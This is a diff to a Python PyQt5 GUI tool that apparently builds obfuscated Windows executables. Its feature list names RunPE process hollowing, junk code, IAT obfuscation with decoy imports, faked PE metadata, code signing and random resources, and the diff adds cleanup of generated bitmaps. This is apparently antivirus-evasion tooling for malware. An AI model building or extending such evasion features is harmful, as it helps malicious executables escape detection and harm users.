@@ -12,10 +12,8 @@ TODO :
     - LoadPE (KEKW)
     - Good entropy
     - Good Section sizes
-    - Add resources
     - Random Windows API calls (help)
-    - Code signing
-
+    
 Done :
     - RunPE
     - Junk code
@@ -23,6 +21,8 @@ Done :
     - IAT obfuscation (adding "normal" imports in addition to the others)
     - Change PE metadata (company, description, etc...)
     - File icon
+    - Code signing
+    - Add resources (random number of random generated bitmaps)
 """
 
 from PyQt5 import QtCore, QtGui, QtWidgets
@@ -31,7 +31,7 @@ from PyQt5.QtCore import QCoreApplication
 from PyQt5.QtGui import QPixmap
 from obfuscation import obfuscate
 from metadata import change_metadata
-import os, shutil
+import os, shutil, glob
 
 class Ui_mainWindow(object):
     def __init__(self) :
@@ -202,6 +202,16 @@ class Ui_mainWindow(object):
         # Cleaning up..
         os.remove("main.cpp")
         os.rename("DO_NOT_TOUCH.cpp", "main.cpp")
+        
+        # Find all BMP files in the directory with a wildcard pattern
+        bmp_files = glob.glob(os.path.join(".", "*.bmp"))
+
+        # Delete each BMP file
+        for bmp_file in bmp_files:
+            try:
+                os.remove(bmp_file)
+            except :
+                pass
         
         if not return_code :
             self.label_2.setText(f"--> {out_filename}")
